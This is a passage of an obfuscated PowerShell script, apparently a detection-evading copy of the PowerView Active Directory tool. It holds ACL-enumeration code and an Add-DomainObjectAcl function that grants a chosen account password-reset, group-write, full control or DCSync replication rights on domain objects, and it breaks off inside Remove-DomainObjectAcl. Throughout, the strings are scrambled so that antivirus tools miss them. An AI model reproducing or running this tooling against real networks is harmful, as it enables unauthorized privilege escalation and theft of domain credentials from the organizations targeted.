                    if ((-not ${pSb`ou`NDPAr`AMeTe`RS}[("{1}{0}" -f'main','Do')]) -and (-not ${p`sbO`UN`Dp`AraM`eTeRS}[("{2}{1}{0}"-f'hBase','c','Sear')])) {
                        
                        
                        ${I`d`eNtITyDomA`in} = ${ID`e`NTiT`yIN`stAN`cE}.("{0}{2}{1}" -f 'SubStri','g','n').Invoke(${i`DenTiTyI`NSt`A`NCE}.("{1}{2}{0}"-f'f','In','dexO').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{1}{0}{3}{4}{2}" -f'ri','W','se','te-Ve','rbo') ('[G'+'et-'+'Dom'+'ainOb'+'ject'+'Acl] '+'Ex'+'tra'+'cted '+'domain'+' '+"'$IdentityDomain' "+'fr'+'om '+"'$IdentityInstance'")
                        ${se`A`RcherArG`UmenTS}[("{0}{1}" -f 'Doma','in')] = ${iDeN`TIt`yDOm`A`iN}
                        ${SeA`RCH`ER} = &("{4}{5}{3}{1}{0}{2}" -f 'a','inSe','rcher','oma','Ge','t-D') @SearcherArguments
                        if (-not ${sea`RC`HER}) {
                            &("{2}{3}{1}{0}"-f'g','Warnin','Wr','ite-') ('['+'Get-D'+'omainOb'+'je'+'ctAcl] '+'Un'+'ab'+'le '+'t'+'o '+'retr'+'i'+'eve'+' '+'dom'+'ain'+' '+'s'+'earcher'+' '+'f'+'or '+"'$IdentityDomain'")
                        }
                    }
                }
                elseif (${I`denTIt`YinS`T`ANcE} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    ${gUIDb`y`TESt`RIng} = (([Guid]${ide`NTIt`Y`instANCe}).("{0}{2}{1}"-f 'To','rray','ByteA').Invoke() | &("{1}{2}{0}{3}" -f'ach-Ob','F','orE','ject') { '\' + ${_}.("{2}{1}{0}" -f'g','trin','ToS').Invoke('X2') }) -join ''
                    ${idE`NTi`T`y`FIlTeR} += "(objectguid=$GuidByteString)"
                }
                elseif (${iDenTIty`I`NS`T`ANCE}.("{0}{1}"-f'C','ontains').Invoke('.')) {
                    ${iDE`Ntity`Fil`T`eR} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                else {
                    ${idE`NTi`Tyfi`ltER} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
                }
            }
            if (${iDENT`I`Tyfi`Lter} -and (${id`E`NTiT`yf`IltER}.("{1}{0}" -f 'im','Tr').Invoke() -ne '') ) {
                ${f`i`lTEr} += "(|$IdentityFilter)"
            }

            if (${PSBoUnD`Parame`TE`RS}[("{1}{0}{2}"-f 'APFil','LD','ter')]) {
                &("{3}{2}{0}{1}" -f 'b','ose','te-Ver','Wri') ('[Get-Do'+'ma'+'i'+'nObjectA'+'cl'+']'+' '+'Usi'+'ng '+'ad'+'ditional'+' '+'L'+'DAP '+'f'+'i'+'lter: '+"$LDAPFilter")
                ${f`ILtER} += "$LDAPFilter"
            }

            if (${fi`lTER}) {
                ${Se`A`RCheR}."f`iltEr" = "(&$Filter)"
            }
            &("{3}{0}{1}{2}" -f'e-Ve','rb','ose','Writ') "[Get-DomainObjectAcl] Get-DomainObjectAcl filter string: $($Searcher.filter) "

            ${RES`Ul`Ts} = ${seA`Rch`eR}.("{1}{2}{0}"-f'dAll','F','in').Invoke()
            ${RE`suL`Ts} | &("{2}{3}{0}{1}"-f 'Obj','ect','W','here-') {${_}} | &("{4}{3}{2}{1}{0}"-f't','c','e','orEach-Obj','F') {
                ${o`BjeCT} = ${_}."PRo`pE`R`TiEs"

                if (${Ob`j`EcT}."oB`JEc`TsId" -and ${oB`jE`cT}."O`BJEc`TSid"[0]) {
                    ${O`BjecT`SiD} = (&("{2}{0}{3}{1}" -f'Ob','t','New-','jec') ("{7}{2}{4}{5}{1}{10}{0}{3}{6}{8}{9}" -f'.Pr','i','ste','i','m','.Secur','ncipal.Security','Sy','Identifie','r','ty')(${o`BjecT}."O`BjEcTs`Id"[0],0))."v`AlUe"
                }
                else {
                    ${OBJ`ectS`ID} = ${n`ULL}
                }

                try {
                    &("{0}{1}{2}"-f 'N','ew-Ob','ject') ("{9}{8}{2}{0}{5}{4}{1}{11}{3}{6}{10}{7}"-f'ity.Ac','Se','r','tyDescr','ssControl.Raw','ce','i','tor','ecu','S','p','curi') -ArgumentList ${O`BjEct}[("{2}{4}{3}{0}{5}{1}"-f 'i','tor','nt','itydescr','secur','p')][0], 0 | &("{4}{1}{3}{0}{2}" -f'e','or','ct','Each-Obj','F') { if (${p`sbo`UNdPara`mEte`RS}[("{1}{0}"-f 'acl','S')]) {${_}."sY`St`eMAcL"} else {${_}."DIs`cr`eTiONAR`YacL"} } | &("{0}{1}{3}{4}{2}"-f'ForE','ach-Obj','t','e','c') {
                        if (${PSBO`U`NdPara`mETerS}[("{3}{0}{1}{2}" -f 't','s','Filter','Righ')]) {
                            ${GuIdFI`l`TEr} = Switch (${r`iGHTSfI`ltER}) {
                                ("{3}{2}{1}{0}" -f 'tPassword','e','es','R') { ("{8}{1}{3}{9}{0}{6}{4}{7}{5}{2}{10}" -f '-a768','299570-246d-','5','11','0','e0','-','0aa006','00','d0','29') }
                                ("{0}{2}{3}{1}" -f'WriteMe','s','m','ber') { ("{5}{2}{7}{6}{4}{3}{1}{0}" -f '2','3049e','-','0','85-00aa0','bf9679c0-0de6','d0-a2','11') }
                                ("{1}{0}" -f 'ault','Def') { ("{0}{4}{7}{5}{6}{2}{3}{1}"-f '000','00000','0','00','00','000-0000-0','000','000-0000-0') }
                            }
                            if (${_}."oB`JeCtTY`PE" -eq ${G`UIDfI`l`TeR}) {
                                ${_} | &("{3}{0}{2}{1}" -f'd-M','r','embe','Ad') ("{3}{1}{0}{2}"-f 'pe','otePro','rty','N') ("{1}{0}" -f'jectDN','Ob') ${o`BJe`ct}."DISTiN`gUiShed`NA`Me"[0]
                                ${_} | &("{2}{1}{0}"-f 'er','emb','Add-M') ("{1}{0}{2}"-f'tePropert','No','y') ("{1}{0}{2}" -f 'bject','O','SID') ${oBJe`ct`siD}
                                ${cO`NT`INue} = ${t`RuE}
                            }
                        }
                        else {
                            ${_} | &("{0}{2}{1}" -f 'Ad','r','d-Membe') ("{2}{0}{1}"-f'teProp','erty','No') ("{1}{0}{2}"-f'jectD','Ob','N') ${o`BJ`EcT}."diST`i`Ng`Ui`SheDNAME"[0]
                            ${_} | &("{1}{2}{0}"-f'ber','A','dd-Mem') ("{3}{2}{1}{0}" -f 'ty','per','ro','NoteP') ("{1}{0}{2}" -f'jectSI','Ob','D') ${O`BJE`cTsId}
                            ${c`ontiNuE} = ${tr`UE}
                        }

                        if (${coN`T`inue}) {
                            ${_} | &("{2}{1}{0}"-f 'ber','dd-Mem','A') ("{0}{3}{2}{1}" -f'Not','y','opert','ePr') ("{2}{3}{1}{0}{4}{5}"-f'ryR','o','Act','iveDirect','i','ghts') (  (  VAriaBLE  ('Wqe'+'G')  -Va)::"tO`oB`jeCT"([System.DirectoryServices.ActiveDirectoryRights], ${_}."aCce`s`SmAsk"))
                            if (${Gu`i`dS}) {
                                
                                ${acLPRo`peRt`IeS} = @{}
                                ${_}."pso`B`JeCT"."prOpE`RTI`eS" | &("{4}{1}{2}{0}{3}" -f'O','ch','-','bject','ForEa') {
                                    if (${_}."n`AME" -match ((("{17}{2}{16}{13}{5}{8}{18}{9}{1}{10}{7}{14}{4}{12}{0}{3}{15}{11}{6}" -f'bj','je','e{0}Inh','e','heri','ct','pe','{0','Ty','{0}Ob','ctAceType','AceTy','tedO','bje','}In','ct','eritedO','ObjectTyp','pe'))  -f  [char]124)) {
                                        try {
                                            ${acL`p`ROPe`RtI`es}[${_}."n`Ame"] = ${g`UiDs}[${_}."Va`LUe".("{1}{0}{2}"-f'tr','toS','ing').Invoke()]
                                        }
                                        catch {
                                            ${A`cL`pr`oPeRtI`eS}[${_}."n`AmE"] = ${_}."v`ALUE"
                                        }
                                    }
                                    else {
                                        ${A`Cl`P`RoPeRtIeS}[${_}."nA`ME"] = ${_}."V`AlUe"
                                    }
                                }
                                ${Out`o`B`jeCT} = &("{1}{0}{2}"-f'Objec','New-','t') -TypeName ("{1}{0}{2}"-f 'SObj','P','ect') -Property ${aC`LP`RoP`ertIes}
                                ${o`UTo`BJect}."PS`OBJeCT"."typ`enameS".("{1}{0}" -f'ert','Ins').Invoke(0, ("{3}{0}{1}{2}"-f'ower','View.AC','L','P'))
                                ${OUTO`BJ`ECT}
                            }
                            else {
                                ${_}."ps`O`BjECT"."T`YPEna`MES".("{0}{1}"-f 'Inse','rt').Invoke(0, ("{0}{2}{1}" -f'PowerView.','L','AC'))
                                ${_}
                            }
                        }
                    }
                }
                catch {
                    &("{3}{2}{0}{1}" -f'er','bose','te-V','Wri') ('[Ge'+'t'+'-Doma'+'inObje'+'ctAcl] '+'Error'+':'+' '+"$_")
                }
            }
        }
    }
}


function AdD-DoM`AInObj`E`CTaCl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{3}{0}" -f'ldProcess','P','S','Shou'}, '')]
    [CmdletBinding()]
    Param (
        [Parameter(pOsitIoN = 0, vAluEFrOmpIPelINe = ${t`RUe}, VALUEFRomPiPElinebypRopERtYNaMe = ${tR`UE})]
        [Alias({"{3}{1}{0}{2}{4}" -f 's','stingui','h','Di','edName'}, {"{0}{3}{4}{2}{1}"-f 'Sa','Name','ount','mA','cc'}, {"{0}{1}"-f'Na','me'})]
        [String[]]
        ${ta`Rg`ETI`DEn`TiTY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${TaRgE`TdO`MA`IN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f 'ter','Fil'})]
        [String]
        ${t`Ar`GEt`LdAPF`I`LTER},

        [ValidateNotNullOrEmpty()]
        [String]
        ${TARG`Ets`Earch`BasE},

        [Parameter(MaNdatORY = ${T`Rue})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${P`R`incipaliDent`I`TY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${prInC`IPal`dOM`Ain},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}" -f'ainControl','Dom','ler'})]
        [String]
        ${S`ERv`ER},

        [ValidateSet({"{0}{1}" -f 'Ba','se'}, {"{2}{1}{0}" -f 'vel','Le','One'}, {"{2}{1}{0}"-f'tree','ub','S'})]
        [String]
        ${Se`ARChs`CopE} = ("{0}{1}" -f'Subtre','e'),

        [ValidateRange(1, 10000)]
        [Int]
        ${RE`SUlTPAg`E`SIZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SeRVEr`TiMEL`imIt},

        [Switch]
        ${tO`M`BSToNE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`ReD`e`NTiaL} =  ( VARIabLE ('0'+'DSqR')  ).VAlue::"em`PTY",

        [ValidateSet('All', {"{1}{0}{2}{3}" -f 'se','Re','tP','assword'}, {"{0}{2}{1}"-f 'W','ers','riteMemb'}, {"{1}{0}"-f'CSync','D'})]
        [String]
        ${r`IGhTS} = 'All',

        [Guid]
        ${r`IgHtSgu`Id}
    )

    BEGIN {
        ${T`ArgETSeaRC`H`eRA`RG`U`MeNtS} = @{
            ("{2}{0}{1}" -f 'roper','ties','P') = ("{0}{1}{4}{2}{3}" -f'dist','in','is','hedname','gu')
            'Raw' = ${t`RuE}
        }
        if (${PsbO`Un`dparAmE`TERs}[("{3}{2}{0}{1}" -f'a','in','m','TargetDo')]) { ${t`A`Rg`e`TsEarCheRarGu`mEnTs}[("{0}{1}"-f 'D','omain')] = ${TaRGE`T`domAin} }
        if (${PSbounDpa`R`A`MeTERs}[("{0}{1}{2}"-f'Tar','getLDAPFil','ter')]) { ${TARgE`T`Se`ArcheR`ArGUmEn`Ts}[("{0}{2}{1}" -f 'LDAP','ilter','F')] = ${TaRgE`T`lDA`Pf`Il`TER} }
        if (${PsbouN`Dp`ARAm`E`T`ERS}[("{2}{3}{1}{0}" -f'archBase','e','Targe','tS')]) { ${tARG`E`TSeaRChERA`RguMeN`Ts}[("{2}{1}{0}" -f'chBase','ar','Se')] = ${tar`GE`T`SEaR`C`HBase} }
        if (${pSb`oUn`DP`ARa`mE`TeRs}[("{0}{1}" -f'Serve','r')]) { ${TAR`GeT`s`eaR`ChERaRGuMe`N`Ts}[("{2}{0}{1}"-f 'e','rver','S')] = ${S`ERV`Er} }
        if (${pSbOu`ND`parAme`TE`RS}[("{2}{1}{3}{0}"-f 'pe','ar','Se','chSco')]) { ${tARge`TSEArcHERa`RGuM`e`Nts}[("{2}{1}{0}" -f 'e','p','SearchSco')] = ${SeA`RcH`sCOPE} }
        if (${Ps`Boun`dpA`RamE`T`eRS}[("{4}{0}{3}{1}{2}"-f'ul','PageSiz','e','t','Res')]) { ${TarGe`TSeArC`heRA`RgU`m`enTS}[("{3}{1}{2}{0}"-f'e','esu','ltPageSiz','R')] = ${res`U`l`Tpa`gesiZE} }
        if (${pSbound`pARAME`Te`Rs}[("{2}{0}{4}{1}{3}" -f 'e','TimeLimi','Serv','t','r')]) { ${taRGE`T`seA`RCHerarGu`mEnTs}[("{1}{3}{4}{0}{2}" -f 'L','Se','imit','r','verTime')] = ${S`ErV`E`RT`IMelImit} }
        if (${P`SB`oundPAramEt`E`RS}[("{3}{0}{2}{1}"-f 'b','tone','s','Tom')]) { ${t`ARGe`Ts`ear`cH`E`RaRgumeNtS}[("{1}{2}{3}{0}"-f 'ne','Tomb','st','o')] = ${to`mbs`ToNE} }
        if (${psb`o`UnDpA`Ra`mETE`RS}[("{1}{2}{0}" -f'ntial','Cre','de')]) { ${TA`RGe`Ts`E`ArCHErArg`U`meNts}[("{0}{1}{2}{3}"-f 'C','rede','n','tial')] = ${CRe`De`N`TiAl} }

        ${pR`in`CIPaLSEa`R`cHER`ARgumE`N`Ts} = @{
            ("{2}{0}{1}"-f 'dent','ity','I') = ${PRInCi`PalIdE`N`TItY}
            ("{1}{3}{2}{0}" -f 's','Propert','e','i') = ("{6}{1}{4}{5}{8}{0}{2}{7}{3}" -f 'e','ting','dnam','id','u','i','dis','e,objects','sh')
        }
        if (${pSbOu`NDpAr`A`MetERS}[("{2}{1}{3}{0}"-f'lDomain','p','Princi','a')]) { ${pRIncI`p`A`lSEaRcHeRaR`GUMenTs}[("{1}{2}{0}" -f 'n','Doma','i')] = ${p`RiNC`i`pALdom`AIn} }
        if (${PSBo`U`NDp`A`R`Ameters}[("{1}{0}"-f'ver','Ser')]) { ${PR`incipa`l`sEArCHerA`R`GUm`ENTs}[("{0}{2}{1}"-f 'Se','r','rve')] = ${sE`R`VEr} }
        if (${P`sbounDpA`RamETe`Rs}[("{2}{1}{0}"-f 'pe','co','SearchS')]) { ${P`RiNc`iPalSEA`RcHeRAr`g`U`me`Nts}[("{0}{2}{1}{3}" -f'S','arch','e','Scope')] = ${sEa`Rchsc`OPe} }
        if (${Ps`Bou`NDPaRa`me`Te`Rs}[("{2}{3}{4}{0}{1}" -f'ag','eSize','R','es','ultP')]) { ${p`RiNciPalSE`A`RCHe`RArg`U`me`NTS}[("{1}{3}{0}{2}"-f 'eS','Re','ize','sultPag')] = ${R`esU`LtpaGE`size} }
        if (${pSB`OU`N`Dpa`RAmet`ERS}[("{0}{1}{3}{2}"-f 'ServerTime','Lim','t','i')]) { ${PRinCi`p`A`LSeAR`ChErA`R`GU`Ments}[("{3}{4}{0}{1}{2}" -f'verTim','eLimi','t','Se','r')] = ${s`ErverTIM`EL`I`miT} }
        if (${PSB`ounDpa`R`AMEtERS}[("{0}{2}{1}"-f'Tomb','ne','sto')]) { ${PRIN`C`iPa`lSEar`c`H`ER`ArGuMENTs}[("{2}{0}{1}"-f'mbston','e','To')] = ${T`oMbs`TOne} }
        if (${ps`BOun`dpA`Ra`METeRS}[("{2}{3}{1}{0}"-f'al','i','Crede','nt')]) { ${PRInci`p`Al`seaR`cHEra`R`GUMenTs}[("{2}{1}{0}"-f'ential','red','C')] = ${cR`eDEn`TiaL} }
        ${prInC`I`P`Als} = &("{1}{0}{2}" -f 'et-Domain','G','Object') @PrincipalSearcherArguments
        if (-not ${PRinc`ip`Als}) {
            throw ('U'+'nable '+'to'+' '+'r'+'esolve '+'princ'+'i'+'pal:'+' '+"$PrincipalIdentity")
        }
    }

    PROCESS {
        ${taRGeTsEA`RChE`RaRg`UmE`N`Ts}[("{0}{2}{1}" -f'Id','y','entit')] = ${t`ARgeTidENt`i`TY}
        ${TARG`eTs} = &("{2}{0}{4}{3}{1}"-f'et-','t','G','Objec','Domain') @TargetSearcherArguments

        ForEach (${targEToB`J`eCt} in ${tA`RGe`Ts}) {

            ${i`NhErI`TAn`Ce`Type} = [System.DirectoryServices.ActiveDirectorySecurityInheritance] ("{1}{0}" -f'ne','No')
            ${cO`NT`ROLty`Pe} = [System.Security.AccessControl.AccessControlType] ("{1}{0}"-f 'llow','A')
            ${ac`eS} = @()

            if (${R`IG`htS`GuId}) {
                ${gu`IDs} = @(${Ri`GHTSGU`Id})
            }
            else {
                ${g`UIds} = Switch (${r`ighTS}) {
                    
                    ("{1}{3}{0}{2}"-f 'etPa','R','ssword','es') { ("{5}{2}{0}{7}{3}{9}{6}{8}{4}{1}"-f '99570-24','6e0529','02','-a7','0aa00','0','-','6d-11d0','0','68') }
                    
                    ("{3}{2}{0}{1}"-f'r','s','riteMembe','W') { ("{4}{2}{5}{6}{1}{0}{3}"-f 'aa00304','-00','96','9e2','bf','79c0-0de6-11d','0-a285') }
                    
                    
                    
                    
                    ("{1}{0}" -f'ync','DCS') { ("{3}{1}{2}{0}{4}{5}{6}" -f 'f79f-00c0','131f6aa-9c07','-11d1-','1','4','f','c2dcd2'), ("{10}{3}{7}{2}{8}{9}{6}{4}{5}{1}{0}" -f 'cd2','00c04fc2d','d-9c07-11d','f6','f','-','79','a','1','-f','1131'), ("{8}{0}{2}{5}{1}{6}{3}{7}{4}" -f'5','cbeda','b76-444d','4','c','-4c62-991a-0fa','6','0','89e9')}
                }
            }

            ForEach (${pr`inCi`paL`objEcT} in ${PriNcI`pa`LS}) {
                &("{1}{2}{0}" -f '-Verbose','W','rite') "[Add-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname) "

                try {
                    ${ID`ent`i`Ty} = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]${PriNciPa`L`Obj`EcT}."OB`JEcts`Id")

                    if (${Gu`iDS}) {
                        ForEach (${gu`id} in ${g`Ui`DS}) {
                            ${ne`W`GUiD} = &("{3}{0}{2}{1}"-f'ew','bject','-O','N') ("{0}{1}" -f 'G','uid') ${Gu`ID}
                            ${A`dR`Igh`TS} = [System.DirectoryServices.ActiveDirectoryRights] ("{1}{0}{2}" -f 'nd','Exte','edRight')
                            ${a`CeS} += &("{1}{2}{0}" -f 't','New-O','bjec') ("{0}{9}{8}{7}{2}{6}{4}{10}{5}{1}{3}" -f'Syste','ryAcces','vic','sRule','.','ecto','es','rySer','o','m.Direct','ActiveDir') ${ide`N`Tity}, ${ADrI`g`Hts}, ${c`oNTRO`ltY`pe}, ${nEWG`UId}, ${iNHE`RiTAN`CeT`Ype}
                        }
                    }
                    else {
                        
                        ${a`d`RighTs} = [System.DirectoryServices.ActiveDirectoryRights] ("{0}{2}{1}"-f'G','nericAll','e')
                        ${Ac`Es} += &("{0}{1}{2}" -f 'New','-Ob','ject') ("{11}{2}{3}{5}{10}{9}{0}{1}{6}{8}{7}{4}" -f've','Dire','stem.','Directo','essRule','ryServic','ctory','cc','A','i','es.Act','Sy') ${ideNTI`Ty}, ${A`Dr`igHTs}, ${conTr`oL`Ty`PE}, ${in`hE`RITAnCET`yPe}
                    }

                    
                    ForEach (${a`ce} in ${AC`eS}) {
                        &("{0}{1}{2}"-f'Write-Verb','os','e') "[Add-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname) "
                        ${T`ARGEt`Entry} = ${T`Ar`gE`To`BJEcT}.("{0}{1}{2}{3}"-f'Ge','tDirector','yE','ntry').Invoke()
                        ${TArgE`Te`NTRY}."PsbA`SE"."O`PtIo`NS"."Se`CuRI`Ty`Ma`SkS" = ("{0}{1}"-f'Da','cl')
                        ${TA`R`g`eTeNTRY}."p`SB`ASE"."obje`ct`S`ec`UrIty".("{3}{1}{0}{2}" -f'sRul','es','e','AddAcc').Invoke(${A`ce})
                        ${TA`Rg`etE`NtRY}."P`SbasE".("{0}{1}{2}" -f'Co','mmitChan','ges').Invoke()
                    }
                }
                catch {
                    &("{0}{1}{2}" -f'Writ','e-Ve','rbose') "[Add-DomainObjectAcl] Error granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname) : $_ "
                }
            }
        }
    }
}


function REmO`Ve-Do`MAiN`OB`JeC`TAcl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{2}{3}{0}{1}"-f 'oces','s','SShould','Pr','P'}, '')]
    [CmdletBinding()]
    Param (
        [Parameter(POsitIoN = 0, VALUEFromPIpEliNe = ${TR`Ue}, vALUeFRoMpIpelinebyPROPERTYnAMe = ${tr`UE})]
        [Alias({"{2}{1}{4}{5}{3}{0}" -f 'Name','i','Distingu','d','sh','e'}, {"{3}{2}{0}{1}"-f 'cco','untName','A','Sam'}, {"{0}{1}" -f 'N','ame'})]
        [String[]]
        ${t`A`RGetIDent`iTy},

        [ValidateNotNullOrEmpty()]
        [String]
        ${TArget`dOm`A`in},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'Fi','lter'})]
        [String]
        ${t`AR`GeTlDA`pf`IlTER},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Ta`Rg`eTsE`ARchBase},

        [Parameter(MaNDatOry = ${t`RUE})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PRiN`ci`PALiDen`Tity},

        [ValidateNotNullOrEmpty()]
        [String]
        ${PR`INCiPAlD`OMa`in},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{3}{2}{4}{1}"-f'Doma','ler','Co','in','ntrol'})]
        [String]
        ${S`Er`VeR},

        [ValidateSet({"{0}{1}"-f'B','ase'}, {"{0}{2}{1}"-f 'One','vel','Le'}, {"{1}{0}"-f'ubtree','S'})]
        [String]
        ${sE`Arc`h`scoPE} = ("{0}{2}{1}"-f'Sub','ee','tr'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rE`SUl`Tp`A`GESize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${se`RV`e`RtiMeLimit},

        [Switch]
        ${tomB`STo`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`eD`ENTIAL} =  (get-VARiAbLe  0dSQr -VALUEO  )::"E`mptY",

        [ValidateSet('All', {"{1}{2}{0}"-f 'd','Reset','Passwor'}, {"{3}{2}{1}{0}"-f's','r','be','WriteMem'}, {"{0}{1}"-f'DCSyn','c'})]
        [String]
        ${R`IG`HtS} = 'All',

        [Guid]
        ${r`iG`hTS`gUID}
    )

    BEGIN {
        ${t`AR`getSea`R`cHeRa`R`gumeNts} = @{
            ("{2}{3}{0}{1}"-f't','ies','Pr','oper') = ("{3}{1}{0}{2}" -f 'am','ishedn','e','distingu')
            'Raw' = ${t`RUE}
        }
        if (${p`sboU`Ndpara`m`ETe`Rs}[("{0}{1}{3}{2}" -f'Ta','rgetDo','n','mai')]) { ${tar`G`e`TseaRcHeRAR`gUM`EnTs}[("{2}{1}{0}" -f 'main','o','D')] = ${t`A`Rg`EtDom`AIn} }
        if (${PSbouNDpA`R`AME`TERs}[("{3}{1}{2}{0}" -f 'APFilter','arget','LD','T')]) { ${t`ArGETseA`RC`h`Era`Rgumen`TS}[("{2}{1}{0}"-f'r','APFilte','LD')] = ${tARg`E`T`ldaPfi`l`TeR} }
        if (${PsbOUnD`PAR`A`ME`T`Ers}[("{1}{0}{2}" -f'hB','TargetSearc','ase')]) { ${ta`RGETs`earCHE`RARGuMe`N`Ts}[("{0}{1}{2}" -f'S','earch','Base')] = ${Tar`g`ETsEArcH`BASE} }
        if (${psb`Ound`PaRAMEt`ERs}[("{0}{1}" -f 'Serve','r')]) { ${targE`T`SeaRc`HErarG`U`meN`Ts}[("{0}{2}{1}"-f'Se','er','rv')] = ${s`ERv`eR} }
        if (${Ps`BOuN`dPArA`MeTeRS}[("{2}{1}{0}"-f 'pe','rchSco','Sea')]) { ${taRgETsea`RCHERAr`g`UmEN`TS}[("{2}{0}{1}"-f'Sco','pe','Search')] = ${SeaR`chsC`OPE} }
        if (${pSbOuNdpar`A`m`e`TerS}[("{1}{2}{4}{0}{3}" -f'geSi','Re','s','ze','ultPa')]) { ${tArg`EtSea`R`CheR`ArgU`MEN`Ts}[("{3}{1}{2}{0}{4}"-f 'Si','sultP','age','Re','ze')] = ${RE`sULt`pAgeSI`ze} }
        if (${psb`o`U`NDpARaMEtERS}[("{0}{3}{1}{2}" -f'Se','rTimeLimi','t','rve')]) { ${TA`RGe`T`SeArc`HeR`ARGU`MEN`TS}[("{4}{2}{1}{3}{0}" -f 'TimeLimit','e','erv','r','S')] = ${sERV`erTImeli`mIt} }
        if (${PsboU`N`dpA`RAMEt`eRs}[("{0}{1}{2}" -f'Tombst','o','ne')]) { ${taR`geTs`EaRc`HeRAR`gu`Me`NTs}[("{0}{2}{1}"-f'T','tone','ombs')] = ${Tom`Bst`o`Ne} }
        if (${pSbO`U`N`dPaRA`meTErs}[("{2}{1}{0}{3}" -f'e','d','Cre','ntial')]) { ${TA`RGETseAr`C`he`RargUMEN`TS}[("{1}{2}{0}{3}" -f 'a','Crede','nti','l')] = ${C`R`e`dENtIAL} }

        ${p`RiNCi`PA`l`S`eARc`h`ERarGuMents} = @{
            ("{0}{2}{1}" -f'I','ntity','de') = ${P`Ri`NcIPA`l`iden`TiTy}
            ("{2}{1}{0}" -f 'es','ti','Proper') = ("{2}{0}{5}{4}{3}{1}{6}"-f 'tingui','me,','dis','a','n','shed','objectsid')
        }
        if (${ps`BO`U`NdpARAmeters}[("{0}{3}{1}{2}{4}" -f 'Prin','o','m','cipalD','ain')]) { ${prI`N`c`ipALsE`A`RchE`R`ARGumeN`TS}[("{1}{2}{0}"-f 'ain','D','om')] = ${pRiN`CiPaLD`o`MaiN} }
        if (${psBoUNDpArAM`E`T`erS}[("{0}{1}{2}" -f 'Ser','v','er')]) { ${pR`inc`IpaLseaRChERAR`guM`eNTs}[("{0}{1}" -f'Se','rver')] = ${Se`R`VEr} }
        if (${PSb`oUNDpar`AMet`eRs}[("{0}{1}{2}" -f 'Sea','rchS','cope')]) { ${priN`CI`PALSEaRcheRarg`UMeN`Ts}[("{1}{0}{2}" -f'arc','Se','hScope')] = ${SeAr`ChS`co`Pe} }
        if (${psB`o`UNdPARa`mEteRs}[("{1}{0}{3}{2}{4}"-f 'su','Re','ag','ltP','eSize')]) { ${p`Ri`N`cipAL`s`Ea`RCHERaR`G`UMENTS}[("{2}{1}{0}{3}" -f'PageS','esult','R','ize')] = ${rE`sul`Tpage`si`ze} }
        if (${pSBOuNdp`Aram`E`TerS}[("{1}{3}{2}{0}"-f 'meLimit','S','rTi','erve')]) { ${P`R`i`NcIPALSEaRc`HeRAR`gUmeNtS}[("{0}{2}{1}{3}" -f 'Ser','ime','verT','Limit')] = ${s`E`Rv`ertI`MELi`mIT} }
        if (${P`SB`oUn`dPaRa`METE`RS}[("{2}{0}{1}" -f'n','e','Tombsto')]) { ${P`RIN`Ci`PA`L`seaRCHERA`R`gUmE`NTS}[("{2}{0}{1}"-f 'bst','one','Tom')] = ${T`omBs`T`onE} }
        if (${PSBou`ND`pArAmET`erS}[("{3}{0}{1}{2}"-f 'e','ntia','l','Cred')]) { ${PrInC`i`pAl`SEaRCHe`R`AR`GUMENtS}[("{2}{1}{0}"-f'al','i','Credent')] = ${CRE`dE`NtIAl} }
        ${P`RInc`IpA`ls} = &("{3}{4}{2}{1}{0}" -f 'ct','inObje','a','Get-D','om') @PrincipalSearcherArguments
        if (-not ${PRIn`c`i`PAlS}) {
            throw ('U'+'na'+'ble '+'t'+'o '+'re'+'s'+'olve '+'princ'+'ipal:'+' '+"$PrincipalIdentity")
        }
    }

    PROCESS {
        ${TA`RGEtse`Ar`cHErA`RGumEnTS}[("{1}{0}" -f'tity','Iden')] = ${T`A`Rg`ETiDE`NTiTY}
        ${t`ARGETS} = &("{0}{4}{3}{1}{2}"-f'G','bje','ct','mainO','et-Do') @TargetSearcherArguments

        ForEach (${t`ArGE`To`BJECT} in ${tA`R`gETS}) {

            ${inH`erI`TAN`cEtY`pe} = [System.DirectoryServices.ActiveDirectorySecurityInheritance] ("{0}{1}"-f 'Non','e')
            ${CONt`Ro`L`TYpE} = [System.Security.AccessControl.AccessControlType] ("{0}{1}"-f 'A','llow')
            ${ac`ES} = @()

            if (${rIGHTs`g`UId}) {
                ${Gu`i`Ds} = @(${RIgh`T`S`guId})
            }
            else {
                ${gU`ids} = Switch (${R`igh`Ts}) {
                    
                    ("{1}{2}{0}{3}"-f 'etPassw','Re','s','ord') { ("{3}{7}{6}{4}{2}{1}{0}{5}" -f'06e05','00aa0','68-','0029','6d-11d0-a7','29','24','9570-') }
                    
                    ("{0}{3}{2}{1}"-f 'Wri','rs','eMembe','t') { ("{10}{1}{2}{4}{9}{8}{5}{3}{7}{0}{6}"-f '0','f967','9c0-0de6','85-0','-','-a2','3049e2','0aa0','1d0','1','b') }
                    
                    
                    
                    
